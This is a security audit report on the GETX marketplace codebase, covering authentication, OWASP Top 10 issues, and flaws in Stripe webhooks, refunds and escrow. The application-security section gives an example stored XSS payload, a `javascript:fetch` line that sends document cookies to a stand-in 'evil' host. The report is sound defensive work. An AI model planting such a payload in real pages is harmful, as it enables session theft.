# SECURITY AUDIT REPORT — GETX Marketplace

> Scope: OWASP Top 10 + ASVS across Authentication/Authorization, Application Security, Payments & Money-Movement, and Infrastructure. Read-only static audit; items needing runtime confirmation are marked.

## Severity summary (security only)
| Severity | Count |
|---|---|
| Critical | 2 |
| High | 7 |
| Medium | 16 |
| Low | 10 |
| Info | 7 |

Adversarial verification: 16 confirmed, 0 uncertain, 2 refuted (of critical/high).

### Confirmed Critical/High security findings
- **AUTH-001** [High] OAuth flow has no `state` parameter (login CSRF / session fixation)
- **AUTH-004** [High] OAuth auto-links to existing account by email without verifying provider email (Discord `verified` not checked)
- **PAY-001** [Critical] Stripe payment & Connect webhooks never receive rawBody; signatures verified against re-serialized JSON
- **PAY-002** [Critical] Admin refundOrder omits currency, routing real refunds to the MOCK provider in production
- **PAY-003** [High] Stripe refund uses the GETX order id as payment_intent; live refunds will be rejected
- **PAY-004** [High] Escrow auto-releases on PAID/IN_PROGRESS orders the seller never marked delivered
- **PAY-005** [High] Dispute resolution moves internal ledgers but never issues the actual buyer refund
- **INFRA-002** [High] Container runs as root; final image ships entire build tree

---

## 1. Authentication & Authorization
## GETX — Authentication & Authorization Security Audit (OWASP ASVS)

**Scope:** `apps/api/src/auth/**`, `main.ts` (cookies/CORS/CSRF), `jwt.strategy.ts`, OAuth strategies/guards, Prisma auth models (`RefreshToken`/`PasswordReset`/`EmailVerification`/`Session`/`OAuthAccount`), and RBAC usage across all controllers.
**Verdict:** This is a **well-engineered, security-conscious auth layer** — markedly above typical startup quality. Core primitives (password hashing, refresh-token rotation + theft detection, cookie storage, brute-force lockout, enumeration resistance) are correct. The residual risk concentrates in the **OAuth flow** (no `state`/CSRF param, weak email-trust on linking, unthrottled callbacks) and a few **defense-in-depth gaps** (in-memory throttler, plaintext OAuth tokens, no step-up auth for admin money actions).

---

### 1. JWT — signing, secrets, claims (ASVS V3, V9)

| Property | Finding | Status |
|---|---|---|
| Algorithm | `HS256` pinned on **both** sign and verify (`auth.service.ts:878`, `jwt.strategy.ts:65`, `auth.module.ts:31`). `algorithms: ['HS256']` array on verify blocks `alg:none` / RS↔HS confusion. | **Secure** |
| Secret strength | `main.ts:46-52` exits if `JWT_ACCESS_SECRET`/`JWT_REFRESH_SECRET` < 32 chars in prod. | **Secure** |
| Issuer/Audience | Signed and **verified** with `issuer:'getx.live'`, `audience:'getx-api'` (`jwt.strategy.ts:66-67`, `auth.service.ts:804-805`). | **Secure** |
| Expiry validation | `ignoreExpiration:false` (`jwt.strategy.ts:63`); access TTL 15m. | **Secure** |
| Token storage (client) | httpOnly + `secure` (prod) + `sameSite=lax` cookies (`auth.service.ts:923-939`). **No token in localStorage / JS.** | **Secure** |
| Revocation on critical events | `passwordChangedAt` invalidates all older access tokens at next request (`jwt.strategy.ts:102-109`). Status (BANNED/DELETED/SUSPENDED) re-checked from DB every request (`jwt.strategy.ts:90-95`). | **Secure** |
| `JWT_REFRESH_SECRET` | Required at boot (`main.ts:31`) and strength-checked, but **never used** — refresh tokens are opaque `randomBytes(48)`, not JWTs. Harmless but misleading. | Info — AUTH-007 |

The access token carries `role` (`auth.service.ts:873`). Because `RolesGuard` reads `req.user.role` which is re-hydrated from the DB by `JwtStrategy.validate()` (`jwt.strategy.ts:76`) — **not** from the JWT claim — a role demotion takes effect immediately and a stale role claim cannot be used for privilege escalation. Good.

### 2. Refresh tokens (ASVS V3.3)

Best-in-class implementation in `auth.service.ts`:
- **Opaque**, 48-byte random (`generateTokens`, L885); **stored only as SHA-256 hash** (`hashRefreshToken`, L899-901) → a DB dump yields no usable token.
- **Single-use rotation**: on refresh the presented token is revoked and a new one minted (L454-465).
- **Reuse / theft detection**: a revoked-but-presented token revokes the **entire family** and writes a `CRITICAL` audit row (L429-444).
- **Cascade revocation** on password change (`account.service.ts:306-309`), reset (`auth.service.ts:571-574`), and ban (`admin-user.service.ts:171-174`).
- DB `expiresAt` checked (L447) and `User.status==='ACTIVE'` re-checked (L450).

Two minor issues: rotation always resets TTL to 7 days regardless of the original `rememberMe` choice (AUTH-003), and family entropy is 16 bytes (adequate).

### 3. Password hashing (ASVS V2.4)

`bcrypt.hash(pw, 12)` on register (`auth.service.ts:124`), reset (L555), change (`account.service.ts:292`). Cost 12 is appropriate. Login uses `bcrypt.compare` with a **dummy hash for missing-user and OAuth-only accounts** (`auth.service.ts:312, 326`) to equalize timing. Password policy: 8–72 chars, upper+lower+digit (`register.dto.ts:5-11`). **Note:** the library is `bcryptjs` (pure-JS) — correct API, but slower than native and a 72-byte truncation applies; the `max(72)` DTO cap correctly avoids silent truncation surprises. **Secure**, with a recommendation to consider argon2id (AUTH-009).

### 4. Brute-force & lockout (ASVS V2.2)

- **DB-backed account lockout**: 5 failures → `lockedUntil = now+15m` (`auth.service.ts:333-340`); counter reset on success (L389). This is replica-safe (lives in Postgres).
- Per-route throttles: login 10/15m, register 5/hr, reset 5/hr, forgot 3/hr, verify-email 10/10m, OTP resend 3/10m, refresh 30/min (`auth.controller.ts`).
- **Gap:** the throttler uses the **in-memory store** (`app.module.ts:53`, comment L50-52) — per-replica, so the IP throttle is diluted on horizontal scale. The DB lockout still holds, so credential stuffing against one account is bounded; but distributed spraying across accounts is only loosely rate-limited per replica (AUTH-006).

### 5. Enumeration resistance (ASVS V2.5) — **Secure**

Register returns identical shape + fake `userId` for duplicate emails (`auth.service.ts:111-116`). Login collapses all pre-success failures (missing user, wrong password, locked, unverified, banned, suspended) to `Invalid credentials` and only checks state **after** bcrypt (L356-384). `forgot-password`, `resend-otp`, `verify-email` all return generic messages. `session` never differentiates failure modes (L810-812). OTP compare is `timingSafeEqual` (L215-217).

### 6. Email verification & password reset (ASVS V2.5, V2.7)

- **Reset token:** `randomBytes(48)` base64url (~256 bits), stored SHA-256-hashed (`auth.service.ts:517-518`), 1h expiry, **single-use** via `used` flag checked atomically (L551, L567-569). Plaintext only in the emailed URL; `referrerPolicy:no-referrer` (`main.ts:79`) prevents `?token=` Referer leakage. **Secure.**
- **OTP:** 6-digit via `crypto.randomInt` (not `Math.random`) (`auth.service.ts:853-858`), SHA-256-hashed at rest (L126), 10-min expiry, **5-attempt cap** (L208), `timingSafeEqual` compare. 6 digits = 10^6 space but the attempt cap + 10/10m throttle make guessing infeasible. **Secure.**

### 7. OAuth (Google / Discord) — **highest-risk area** (ASVS V2.10, V3.5)

- **No `state` parameter / no CSRF protection on the OAuth flow.** Strategies don't set `state:true` and there is no session middleware (`google.strategy.ts:34-42`, `discord.strategy.ts:21-29`; no `express-session`/`session:true` anywhere). An attacker can complete a consent flow with **their own** provider account and trick a victim's browser into hitting the callback, logging the victim into the attacker's account (login CSRF / session fixation) — or pre-seed a linkable identity. **AUTH-001 (High).**
- **Callback routes are not throttled.** Only `GET /auth/google` and `/auth/discord` carry `@Throttle` (`auth.controller.ts:183,208`); `…/callback` (L193, L217) have none, leaving the token-exchange path open to abuse. **AUTH-002 (Medium).**
- **Account auto-linking trusts the provider email without re-verification.** `handleOAuth` Case 2 links a new provider to any existing User with a matching email (`auth.service.ts:643-664`). Google emails are reliably verified, but the **Discord strategy does not check the `verified` flag** — it only checks `profile.email` exists (`discord.strategy.ts:44`). A Discord account with an unverified email matching a victim's address could be auto-linked, enabling account takeover of a password-based account via "Sign in with Discord". **AUTH-004 (High).**
- **OAuth provider tokens stored in plaintext** in `OAuthAccount.accessToken/refreshToken` (`auth.service.ts:632-635, 650-653, 690-696`; schema `@db.Text`, L392-393). Unlike refresh tokens (hashed) and bank PII (`encryptPii`), these are not encrypted at rest. **AUTH-005 (Medium).**
- New OAuth users are created with `country:'US'` and `emailVerified:now()` (L678, L687) — acceptable since the country gate is re-applied at KYC/payout, but worth noting it bypasses the signup sanctions allowlist.

### 8. RBAC / authorization (ASVS V4)

- **Global guard chain** registered as `APP_GUARD` in order Throttler → `JwtAuthGuard` → `RolesGuard` (`auth.module.ts:51-53`). Every route is authenticated unless explicitly `@Public()`. `JwtAuthGuard` honours `@Public()` via Reflector (`jwt-auth.guard.ts:13-18`).
- **`@Roles` is used in exactly one place** — `AdminController` (`@Roles('ADMIN','SUPER_ADMIN')`, `admin.controller.ts:47`) — which is correct: admin is the only role-gated surface; buyer/seller authorization is enforced by **per-resource ownership checks in services**, not roles. (`RolesGuard` correctly throws `ForbiddenException` on missing user / insufficient role, `roles.guard.ts:28-31`.)
- **`@Public()` inventory reviewed** (40+ routes): all are legitimately public (marketing reads, catalog browse, leaderboards, health, signed webhooks, OAuth, the soft `session` probe). **No sensitive/mutating route is incorrectly `@Public`.** Money routes (`wallet`, `orders`, `payouts` except the HMAC-verified `connect/webhook`) carry **no** `@Public` and inherit the global JwtAuthGuard. Webhooks are public-by-design but verified by HMAC.
- **Privilege-escalation guards** present: admins cannot ban themselves or another admin/super-admin (`admin-user.service.ts:142, 149-151`); the role enum is closed (`admin.dto.ts:8`).
- `OptionalJwtAuthGuard` correctly swallows invalid tokens and returns anonymous (`optional-jwt-auth.guard.ts`), used only on read-only custom-request browse routes.

**Gap:** no **step-up / re-authentication** for high-impact admin actions (force-release escrow, refund, resolve dispute, ban). A hijacked admin session = full money control. Sensitive admin operations should require recent re-auth or 2FA. **AUTH-008 (Medium).** Relatedly, `UserPii.twoFactorSecret` exists in the schema but **no TOTP verification path is wired** (only anonymization clears it) — 2FA is effectively unimplemented. **AUTH-010 (Medium).**

### 9. Cookies / CORS / CSRF (ASVS V3.4, V13)

- Cookies: `httpOnly`, `secure` (prod), `sameSite=lax`, host-only (`auth.service.ts:923-939`). **Secure.**
- **CSRF defense**: state-changing requests must be `Content-Type: application/json` (415 otherwise, `main.ts:102-115`), which forces a CORS preflight and neutralizes `sameSite=lax` form-POST CSRF. Combined with a strict CORS allowlist (`main.ts:127-140`). **Secure** (custom but sound). Note this is the *only* CSRF layer — losing the Content-Type check (e.g. a future `text/plain` body parser) would re-open CSRF; an explicit anti-CSRF token would be more robust defense-in-depth.
- `GET /auth/ws-token` returns the access token in the **JSON body** so the SPA can pass it to the socket.io handshake (`auth.controller.ts:153-159`). This deliberately moves the token out of the httpOnly cookie into JS-readable memory for the WS upgrade — a pragmatic Safari-ITP workaround, but it means an XSS can now read a live access token. **AUTH-011 (Low/Info)**; mitigated by web's strict CSP, but seller/admin ship no CSP.

---

### Priority remediation order
1. **AUTH-001** add OAuth `state` (CSRF) — High
2. **AUTH-004** verify provider email before auto-linking; check Discord `verified` — High
3. **AUTH-002** throttle OAuth callbacks; **AUTH-005** encrypt OAuth tokens; **AUTH-006** Redis throttler store; **AUTH-008** admin step-up; **AUTH-010** finish 2FA — Medium
4. **AUTH-003 / 007 / 009 / 011** — Low/Info hardening

Overall this is a strong auth implementation; closing the OAuth gaps brings it to enterprise grade.

---

## 2. Application Security (OWASP Top 10)
## GETX Marketplace — Application Security Audit (OWASP Top 10)

**Auditor role:** Senior Security Engineer (AppSec) · **Mode:** Read-only · **Date:** 2026-05-30
**Scope:** `apps/api/src` (controllers/services, validators, uploads, chat gateway, listings, reviews, custom-requests, offers, wallet, payments, admin), `apps/web|seller|admin` XSS sinks + security headers, Prisma raw queries.

---

### Executive summary

This is a **mature, well-hardened codebase**. The team has clearly run prior security passes (findings tagged `PAY-CRIT-*`, `RES-HIGH-*`, `AUTH-CRIT-*`, `WEB-HIGH-*`, `DB-CRIT-*`) and the controls I would expect on a real-money marketplace are present and correct:

- **Broken Access Control / IDOR (the priority area): no exploitable IDOR found.** Every resource read/mutation I inspected re-verifies ownership against `req.user.id` at the service layer — orders, conversations/messages, wallet, withdrawals, addresses, payment-methods, reviews, listings, custom-requests, offers, notifications, saved-searches. Checks are `if (resource.<owner>Id !== userId) throw ForbiddenException()`, not mere authentication.
- **CSRF** is defended in depth: httpOnly + `sameSite=lax` cookies, `secure` in prod, plus a global `Content-Type: application/json` enforcement middleware (415 otherwise) on all state-changing verbs, plus a strict CORS allowlist with credentials. No GET endpoint performs a state mutation.
- **SQL/NoSQL injection: none.** Only two raw queries exist (`$queryRaw\`SELECT 1\``, parameter-free health pings). All filtering/sorting uses Prisma's typed query builder with enum-whitelisted `sort`/`orderBy` and validated inputs. JSON `attributes` filters use Prisma's `path`/`equals` operators, not string interpolation.
- **SSRF: no surface.** Server-side `fetch` calls target only hardcoded hosts (Sumsub base, Stripe API). The API **never fetches user-supplied URLs** (avatars/images/videos are stored as strings and rendered client-side only). The `safe-url` validator additionally rejects `javascript:`/`data:text/html`/SVG.
- **File upload** is exemplary: auth-gated, throttled, 5 MB cap, magic-byte content sniffing that must match the declared MIME, extension derived from validated MIME (anti-`.php`), `userId` sanitized for path traversal, random key.
- **Mass assignment: none.** No `...req.body` spreads into Prisma. Every write explicitly enumerates fields; updates use per-field `...(dto.x !== undefined ? {x} : {})` guards.
- **XSS:** the one risky sink (Product JSON-LD embedding user-controlled `listing.title/description/seller.username`) correctly escapes `<`,`>`,`&` before `dangerouslySetInnerHTML`. All other user content renders as React text children (auto-escaped). SVG upload/render is disabled (`dangerouslyAllowSVG:false`, `safeImageUrl` rejects SVG).
- **Payments integrity** is strong: webhook HMAC verification, replay window, amount+currency verification against the order, idempotency rows written *inside* the business transaction, chargeback clawback, and CRITICAL-severity audit on every admin money action.

The findings below are genuine but **none are Critical**. The most material is the **missing Content-Security-Policy on the admin and seller apps** — both render user-controlled content and handle money, yet lack the CSP that the buyer app ships.

---

### Findings overview

| ID | Severity | Category | Title |
|----|----------|----------|-------|
| APPSEC-001 | Medium | Security Misconfiguration | No Content-Security-Policy on admin & seller apps |
| APPSEC-002 | Low | XSS / Injection | `website` profile field accepts non-http(s) URL schemes |
| APPSEC-003 | Low | Broken Access Control | Chat WebSocket gateway allows no-Origin connections |
| APPSEC-004 | Low | DoS / Resource | Throttler uses in-memory store (per-replica) |
| APPSEC-005 | Info | XSS | Root-layout JSON-LD not `<`/`>` escaped (no user data today) |
| APPSEC-006 | Info | Access Control | Front-end middleware role gate is UX-only (verified correct) |

---

### Controls verified correct (acknowledged, no action)

| Area | Evidence |
|------|----------|
| Order IDOR | `orders.service.ts` `getOrder/markDelivered/confirmReceipt/openDispute/reorder` all check `buyerId`/`sellerId === userId` |
| Conversation/message IDOR | `conversations.service.ts` every method checks participant; `chat.gateway.ts` `join`/`typing`/`mark_read`/`send_message` gate via `isParticipant` |
| Wallet/withdrawal | `wallet.service.ts` ownership + KYC-VERIFIED gate + atomic `updateMany` debit predicate + daily velocity caps + saved-method validation |
| Payments webhook | `payments.service.ts` amount/currency verify (PAY-CRIT-003), idempotency-in-tx (PAY-CRIT-001), fail-closed on missing secret |
| File upload | `uploads.service.ts` magic-byte + MIME-derived ext + path-traversal sanitize; `uploads.controller.ts` auth + throttle + 5 MB |
| Raw SQL | only `SELECT 1` health pings |
| CSRF | `main.ts:102-115` Content-Type gate + sameSite=lax + CORS allowlist |
| Clickjacking | `frame-ancestors 'none'` (web) + `X-Frame-Options: DENY` (all three apps) |
| Admin RBAC | `admin.controller.ts` `@UseGuards(RolesGuard) @Roles('ADMIN','SUPER_ADMIN')`; money actions CRITICAL-audited |

---

### Detailed findings

#### APPSEC-001 — No Content-Security-Policy on admin & seller apps (Medium)
**What:** `apps/web/next.config.mjs` ships a strict CSP (`frame-ancestors 'none'`, `object-src 'none'`, scoped `script-src`/`connect-src`/`img-src`, `upgrade-insecure-requests`). `apps/admin/next.config.mjs` and `apps/seller/next.config.mjs` set only `X-Content-Type-Options`, `X-Frame-Options: DENY`, `Referrer-Policy`, `Permissions-Policy` — **no `Content-Security-Policy` header**.
**Why it's wrong:** The admin app renders the most sensitive user-controlled content (user names, emails, listing titles/descriptions, review comments, dispute text, audit-log metadata) and the seller app renders buyer messages, order data, and request text. If any single output-encoding bug is ever introduced in these React trees, there is no CSP backstop to neutralize injected script, no `connect-src` allowlist to stop data exfiltration to an attacker host, and no `object-src 'none'`. These are exactly the apps where an XSS would be most damaging (admin = full platform control; seller = payout funds).
**Impact:** Defense-in-depth gap. Raises the blast radius of any future DOM-XSS from "contained" to "full account/session takeover + data exfiltration" on the two highest-value surfaces.
**Fix:** Port the web app's `headers()` CSP into `apps/admin/next.config.mjs` and `apps/seller/next.config.mjs`, tightening `connect-src` to each app's API origin and removing the buyer-only allowances (Crisp, Pexels). Admin almost certainly does not need `'unsafe-inline'` in `script-src` beyond Next's hydration needs — start strict and loosen only as build errors demand.
**Files:** `apps/admin/next.config.mjs`, `apps/seller/next.config.mjs`

#### APPSEC-002 — `website` profile field accepts non-http(s) URL schemes (Low)
**What:** In `apps/api/src/account/dto/account.dto.ts:55-60`, `website` is validated with `z.string().url().max(200)` — **not** the project's own `safeHttpUrl()` helper. Zod's `.url()` (WHATWG URL parser) accepts `javascript:`, `data:`, `vbscript:` schemes. The sibling `avatar` field correctly uses `safeHttpUrl()` (commented `RES-HIGH-022`), so the inconsistency is clearly an oversight.
**Why it's wrong:** A user can store `website: "javascript:fetch('//evil/?c='+document.cookie)"`. Mitigating reality: I grepped all three apps and **`website` is never rendered as a clickable `href` anywhere** (only `bio` is rendered, as escaped text). So this is currently a *latent* stored-payload, not an active XSS. The risk is that a future "Visit website" link on the seller storefront would silently turn this into stored XSS.
**Impact:** Low today (no sink). Becomes High the moment `website` is rendered as an anchor `href`.
**Fix:** Replace `z.string().url()` with `safeHttpUrl()` to match `avatar`. If `website` is ever linked, also add `rel="noopener noreferrer"` and a runtime scheme check in the component.
**Files:** `apps/api/src/account/dto/account.dto.ts`

#### APPSEC-003 — Chat WebSocket gateway allows no-Origin connections (Low)
**What:** `apps/api/src/conversations/chat.gateway.ts:59` — the WS CORS callback returns `cb(null, true)` for any request with no `Origin` header (`if (!origin) return cb(null, true)`), commented as a bypass for curl/mobile-webviews/server-to-server.
**Why it's wrong:** Browser clients always send `Origin`, so the legitimate-browser case never needs this. The bypass means a non-browser client can connect from anywhere. It is *not* an auth bypass — every socket still must present a valid JWT (`handleConnection` verifies the token and rejects non-`ACTIVE` users), and all room joins re-check participation. So the only thing the no-Origin allowance grants is the ability to *attempt* an authenticated connection from a non-browser client, which a determined attacker can do anyway. Worth noting as a hardening item, not a vulnerability.
**Impact:** Low. The Origin check is a CSWSH (cross-site WebSocket hijacking) defense; combined with the mandatory JWT, hijacking is already prevented. The no-Origin path slightly weakens the CSWSH posture for clients that don't send Origin.
**Fix:** If mobile/native clients are not yet a requirement, reject no-Origin connections (`return cb(new Error('Origin required'))`). Otherwise leave as-is and document that JWT verification is the primary control.
**Files:** `apps/api/src/conversations/chat.gateway.ts`

#### APPSEC-004 — Throttler uses default in-memory store (Low)
**What:** `ThrottlerModule.forRoot([{ttl:60, limit:60}])` (global, `auth.module.ts`) uses the default in-memory store; `app.module.ts` comments flag that a Redis store is needed for horizontal scaling but is unwired. Per-route brute-force limits (login 10/15min, register 5/hr, withdrawal flows, OTP) all rely on this store.
**Why it's wrong:** With >1 API replica behind the Railway load balancer, an attacker's requests fan out across replicas; the effective per-IP limit becomes `limit × replicaCount`, materially weakening login/OTP brute-force and checkout-spam protections. `redis.factory.ts` already provides a singleton ioredis client (used by the socket adapter) that could back a shared throttler store.
**Impact:** Brute-force / abuse rate limits are weaker than configured under multi-replica deploys.
**Fix:** Wire `@nest-lab/throttler-storage-redis` (or equivalent) using the existing `getRedisClient()` singleton so limits are global across replicas.
**Files:** `apps/api/src/auth/auth.module.ts`, `apps/api/src/app.module.ts`, `apps/api/src/common/redis.factory.ts`

#### APPSEC-005 — Root-layout JSON-LD not entity-escaped (Info)
**What:** `apps/web/src/app/layout.tsx:95,99` and `apps/web/src/components/support/crisp-chat.tsx:49` use `dangerouslySetInnerHTML` without the `<`/`>`/`&` escaping that the listing page (`accounts/[slug]/page.tsx:134`) correctly applies.
**Why it's only Info:** Their content is **entirely static/env-derived** (`organizationJsonLd`, `websiteJsonLd`, `JSON.stringify(crispId)`) — no user-controlled data flows in, so there is no breakout today.
**Fix (preventative):** Apply the same `.replace(/</g,'\\u003c').replace(/>/g,'\\u003e').replace(/&/g,'\\u0026')` pattern (or a shared `serializeJsonLd()` helper) so a future refactor that introduces dynamic values can't regress into XSS.
**Files:** `apps/web/src/app/layout.tsx`, `apps/web/src/components/support/crisp-chat.tsx`

#### APPSEC-006 — Front-end middleware role gate is UX-only (Info, verified correct)
**What:** `apps/admin/src/middleware.ts` and `apps/seller/src/middleware.ts` fetch `/auth/session` and redirect non-privileged users. These gates **fail open conceptually** only in the sense that they are defense-in-depth UX (they prevent shipping the bundle to anonymous visitors) — the authoritative control is the API's `RolesGuard` + `JwtAuthGuard`, which I verified is globally registered and enforced on every admin route. No action required; recorded so reviewers don't mistake the middleware for the primary authorization boundary.
**Files:** `apps/admin/src/middleware.ts`, `apps/seller/src/middleware.ts`, `apps/api/src/admin/admin.controller.ts`

---

### OWASP Top 10 (2021) coverage

| Category | Status | Notes |
|----------|--------|-------|
| A01 Broken Access Control | **Pass** | No IDOR found; ownership enforced server-side everywhere |
| A02 Cryptographic Failures | Pass (out of scope detail) | AES-256-GCM PII, bcrypt cost 12, SHA-256 hashed refresh/OTP |
| A03 Injection | **Pass** | No raw SQL injection; no XSS sink with user data unescaped |
| A04 Insecure Design | Pass | Escrow state machine, idempotency, atomic claims |
| A05 Security Misconfiguration | **Partial** | APPSEC-001 (admin/seller CSP) |
| A06 Vulnerable Components | Out of scope (infra audit) | `bcryptjs 2.x` noted in infra map |
| A07 Auth Failures | Pass | Lockout, constant-time bcrypt, token rotation/theft-detection |
| A08 Data Integrity Failures | Pass | Webhook HMAC + amount/currency verify + in-tx idempotency |
| A09 Logging Failures | Pass | CRITICAL-severity audit on money actions, rethrown on failure |
| A10 SSRF | **Pass** | API never fetches user-controlled URLs |

**Overall application-security posture: strong (88/100).** Address APPSEC-001 (CSP on admin/seller) and APPSEC-002 (`website` validator) to close the only gaps with real future exploit potential.


---

## 3. Payments & Money-Movement Integrity
# GETX — Payments & Money-Movement Security Audit

**Auditor role:** Senior Security Engineer (Payments) — read-only enterprise audit
**Scope:** `apps/api/src/payments`, `wallet`, `payouts`, `orders` (service + escrow cron + listeners), `webhooks`, admin finance/order money flows, and the Prisma money models.
**Verdict:** The core money-movement *logic* is unusually disciplined — atomic `updateMany` claims, `Decimal(14,2)` throughout (no float money), `WebhookEvent` idempotency, escrow state-machine claims, server-side price derivation, and CRITICAL-audited admin actions. However, **two production-breaking, money-impacting defects** exist in the webhook-ingestion and refund-routing wiring that undermine the otherwise solid design, plus a high-severity escrow-release gap that can pay sellers who never delivered.

---

## 1. What is implemented correctly (acknowledged controls)

| Control | Evidence | Assessment |
|---|---|---|
| **Server-side amount derivation** | `payments.service.ts:99-106` — charge = `order.buyerTotal − walletApplied − loyaltyUsdApplied`, read from the DB order, never from the client. Checkout endpoint takes only `orderId`. | Correct. No client-supplied price reaches Stripe. |
| **Webhook amount + currency re-verification** | `payments.service.ts:331-355` (PAY-CRIT-003) — rejects a $1 session against a $1000 order; currency compared case-insensitively. | Strong. Blocks underpay tampering. |
| **WebhookEvent idempotency** | `schema.prisma:440-448` `@@unique([provider, externalId])`; row written *inside* the same `$transaction` as the business mutation (`payments.service.ts:372-381`, `547-551`, `666-670`); P2002 treated as idempotent. | Correct, atomic, race-safe. |
| **Escrow release atomic claim** | `orders.service.ts:453-457` — `updateMany({ where: { id, escrowStatus: 'HELD' }})`; `claim.count===0 → return null`. Concurrent/duplicate releases cannot double-credit. | Excellent (PAY-CRIT-005). |
| **Wallet overdraw protection** | `wallet.service.ts:391-408` — debit via `updateMany({ where: { sellerWallet: { gte: x }}})`; count===0 → throw. Withdraw, apply, cashback all in `$transaction`. | Correct optimistic guard; no SELECT-FOR-UPDATE needed. |
| **Withdraw guardrails** | `wallet.service.ts:335-382` — KYC `VERIFIED` required, combined-balance check, per-method floors, daily velocity (5 req / $5k), UPI destination validated against saved `PaymentMethod`. | Solid (PAY-HIGH-014/020, PAY-CRIT-007). |
| **Money precision** | All amounts `Decimal(14,2)`, FX `Decimal(12,6)` (`schema.prisma:104-108, 809-839, 1095, 1141`). Cent math via `Math.round(x*100)`. | No float money. Correct. |
| **Sumsub webhook** | `sumsub.controller.ts` — HMAC verify, prod refuses unsigned, Zod shape, idempotency key `applicantId:type:createdAt`, `timingSafeEqual` on hex buffers. | Correct (and this is the one webhook whose rawBody IS captured — see PAY-001). |
| **Admin authority** | `admin.controller.ts:47` `@Roles('ADMIN','SUPER_ADMIN')`; force-release / refund / dispute-resolve all CRITICAL-audited; clawback on already-released escrow. | Authorization correct. |
| **Stripe replay window** | `stripe.provider.ts:294-304`, `payouts.controller.ts:166-175` — 5-min tolerance + `timingSafeEqual`. | Correct, when it runs (see PAY-001). |

---

## 2. Critical & high findings

### PAY-001 (Critical) — Stripe payment & Connect webhooks never receive `rawBody`; signatures are verified against re-serialized JSON

**What.** Raw request bytes are captured only for URLs under `/api/v1/webhooks/`:

```ts
// main.ts:87-97
const isWebhook = req.url?.startsWith('/api/v1/webhooks/') ?? false;
json({ limit: isWebhook ? '1mb' : '100kb',
       verify: isWebhook ? (r, __, buf) => { r.rawBody = buf; } : undefined })(...)
```

The actual webhook routes are:
- Stripe checkout: `@Controller('payments')` + `@Post('webhook/:provider')` → **`/api/v1/payments/webhook/stripe`**
- Stripe Connect: `@Controller('payouts')` + `@Post('connect/webhook')` → **`/api/v1/payouts/connect/webhook`**
- Sumsub: `@Controller('webhooks/sumsub')` → `/api/v1/webhooks/sumsub` ✅ (only this one matches)

Both Stripe endpoints fall back to `req.rawBody?.toString() ?? JSON.stringify(req.body ?? {})` (`payments.controller.ts:63`, `payouts.controller.ts:86`). Stripe computes its HMAC over the **exact transmitted bytes**; `JSON.stringify(req.body)` re-serializes the *parsed* object, changing key order, whitespace, number formatting, and Unicode escaping.

**Why it's wrong.** HMAC over re-serialized JSON will not equal Stripe's signature for any non-trivial payload. Additionally, `NestFactory.create` (default `bodyParser:true`, `main.ts:62`) installs its own JSON parser; the later `app.use(json(...))` is a second parser whose `verify` callback may never even fire (body already consumed), so `rawBody` can be `undefined` for *every* route.

**Impact.**
- In production with `STRIPE_WEBHOOK_SECRET` set, `verifySignature` fails → `parseWebhook` returns `null` → `BadRequestException('Invalid webhook')`. **`checkout.session.completed` is never processed → paid orders never transition PENDING→PAID/HELD → sellers never get notified, escrow never starts, buyers are charged but order looks unpaid.** This is a payment-flow outage.
- The `JSON.stringify` fallback existing at all is a security smell: if signature is mismatched-but-the-code-path-changed, verification integrity rests on byte-exact rawBody, which is absent.

**Recommended fix.** Capture rawBody for the actual webhook paths. Either broaden the predicate to include `/api/v1/payments/webhook` and `/api/v1/payouts/connect/webhook`, or (preferred) use Nest's first-class support: `NestFactory.create(AppModule, { rawBody: true })` and read `req.rawBody`, removing the custom `app.use(json())`. Add an integration test that posts a real Stripe-signed fixture and asserts `200 { success: true }`.

**Files:** `apps/api/src/main.ts:85-97`, `apps/api/src/payments/payments.controller.ts:56-69`, `apps/api/src/payouts/payouts.controller.ts:80-97`, `apps/api/src/payments/providers/stripe.provider.ts:177-197`.

---

### PAY-002 (Critical) — Admin `refundOrder` omits `currency`, routing real refunds to the MOCK provider in production

**What.** `admin-order.service.ts:193-197`:

```ts
const result = await this.payments.processRefund({
  transactionId: order.paymentTransactionId,
  amount: dto.fullRefund ? undefined : Math.round((dto.amount ?? order.buyerTotal.toNumber()) * 100),
  reason: dto.reason,
});   // ← no `currency`
```

`PaymentsService.processRefund` (`payments.service.ts:721-731`):

```ts
const provider = opts.currency ? this.resolveProvider(opts.currency) : this.providers.mock;
return provider.refund(opts);
```

With no `currency`, it **unconditionally uses `this.providers.mock`**, whose `refund()` returns `{ success:true, refundId:'mock_refund_...' }` without contacting Stripe (`mock.provider.ts:38-46`).

**Why it's wrong.** The admin flow then proceeds to mark the order `REFUNDED`/`escrowStatus:REFUNDED`, restore the buyer's wallet/loyalty credit, and **claw back the seller's `sellerWallet`** (`admin-order.service.ts:233-252`) — all on the strength of a fake refund ID. No money is actually returned to the buyer's card.

**Impact.** Buyer is told (and the DB records) that `$X has been refunded to your original payment method`, but Stripe never issued a refund. The seller loses the funds (clawed back), the buyer keeps the goods AND was never refunded, and the platform's ledger says everyone is settled. Net: silent financial loss, reconciliation breakage, and chargeback exposure. This fires on *every* admin refund and dispute-driven refund in production.

**Recommended fix.** Pass `currency: order.currency` into `processRefund`, and have `processRefund` fail closed (throw) in production when the resolved provider is `mock`, rather than silently faking success. Same applies to dispute-resolution refunds in `resolveDispute` (which doesn't call the provider at all — see PAY-005).

**Files:** `apps/api/src/admin/services/admin-order.service.ts:193-197`, `apps/api/src/payments/payments.service.ts:721-731`, `apps/api/src/payments/providers/mock.provider.ts:38-46`.

---

### PAY-003 (High) — Stripe refund uses the GETX order id as `payment_intent`; live refunds will be rejected

**What.** `order.paymentTransactionId` is set at checkout to the **session id** (`payments.service.ts:121`), then overwritten on `checkout.completed` to `event.externalId`, which for that event is `obj.client_reference_id` = the **GETX order id** (`stripe.provider.ts:221-223`, `payments.service.ts:389`). The Stripe refund call then does:

```ts
// stripe.provider.ts:152-153
form.set('payment_intent', opts.transactionId);   // ← a GETX order id, e.g. "clx123…"
```

No Stripe `payment_intent` (`pi_…`) or `charge` (`ch_…`) is ever captured from the webhook (`amount_total`, `client_reference_id`, `currency`, `metadata` are read; `payment_intent` is not).

**Why it's wrong.** Stripe's `/v1/refunds` requires a real `payment_intent`/`charge` identifier. Passing a cuid will return a 4xx (`No such payment_intent`). The provider then throws, and the admin path catches it as `'Provider refund failed; order not updated'` (`admin-order.service.ts:199-202`).

**Impact.** Even after PAY-002 is fixed (currency passed so the *real* Stripe provider is used), refunds still cannot succeed because the stored transaction id is not a Stripe object. Refund attempts hard-fail; admins cannot refund buyers through the product. (The two bugs mask each other today: mock "succeeds", real Stripe would fail.)

